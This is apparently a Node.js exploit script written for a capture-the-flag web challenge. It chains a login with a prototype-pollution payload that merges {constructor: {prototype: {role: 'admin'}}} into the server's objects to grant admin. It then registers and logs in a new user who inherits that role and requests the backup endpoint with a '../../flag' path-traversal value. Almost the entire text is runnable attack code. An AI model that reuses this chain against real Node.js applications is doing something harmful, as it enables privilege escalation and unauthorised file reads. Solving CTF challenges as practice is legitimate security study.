
const http = require('http');

// 1. Login any existing user first
const existingUid = "ae31d708980a4e888efe43e6cd3d6de0";

const querystring = require('querystring');
const loginPost = querystring.stringify({ uid: existingUid });

const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginPost)
  }
};

console.log("1. Login existing user");
const loginReq = http.request(loginOpts, (res) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("2. Poison Object.prototype.role = 'admin' via merge!");
  console.log("   Payload: {uid, constructor: {prototype: {role: 'admin'}}}");
  console.log("   This will recursively merge to Object.prototype.role!");

  // Correct poison payload: this actually gets to Object.prototype!
  const poisonData = JSON.stringify({
    "uid": existingUid,
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });

  const poisonOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(poisonData),
      'Cookie': cookie
    }
  };

  const poisonReq = http.request(poisonOpts, (poisonRes) => {
    let body = '';
    poisonRes.on('data', chunk => body += chunk);
    poisonRes.on('end', () => {
      console.log("✅ Poisoning complete! Object.prototype.role is now 'admin'");
      console.log("3. Register NEW user - it will inherit role from prototype");
      registerNew(cookie);
    });
  });
  poisonReq.write(poisonData);
  poisonReq.end();
});

loginReq.on('error', err => console.error(err));
loginReq.write(loginPost);
loginReq.end();

function registerNew(cookie) {
  const postData = querystring.stringify({ username: "realadmin" });
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/register',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData),
      'Cookie': cookie
    }
  };

  const req = http.request(opts, (res) => {
    let regBody = '';
    res.on('data', chunk => regBody += chunk);
    res.on('end', () => {
      const match = regBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
      if (match) {
        const uid = match[1];
        console.log(`✅ Registered new user, UID: ${uid}`);
        console.log("4. Login new user, check role");
        loginNew(uid);
      } else {
        console.log("❌ No UID found");
        console.log(regBody);
      }
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function loginNew(uid) {
  const postData = querystring.stringify({ uid: uid });
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(opts, (res) => {
    const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    checkRole(uid, cookie);
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function checkRole(uid, cookie) {
  const profileData = JSON.stringify({ uid: uid });
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(profileData),
      'Cookie': cookie
    }
  };

  const req = http.request(opts, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\nProfile response:");
      console.log(body);
      try {
        const json = JSON.parse(body);
        console.log("\nParsed:");
        console.log(JSON.stringify(json, null, 2));
        console.log("\nRole:", json.role);
        if (json.role === 'admin') {
          console.log("\n🎉 SUCCESS! ROLE IS ADMIN! GET FLAG...");
          getFlag(cookie);
        } else {
          console.log("\n❌ Still not admin");
        }
      } catch(e) {
        console.log("JSON error", e);
      }
    });
  });
  req.on('error', err => console.error(err));
  req.write(profileData);
  req.end();
}

function getFlag(cookie) {
  // We know backup endpoint is only accessible to admin, it must be /api/backup
  const postData = querystring.stringify({ file: '../../flag' });
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/backup',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData),
      'Cookie': cookie
    }
  };

  const req = http.request(opts, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\n🏁 FINAL FLAG RESULT:");
      console.log(body);
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}
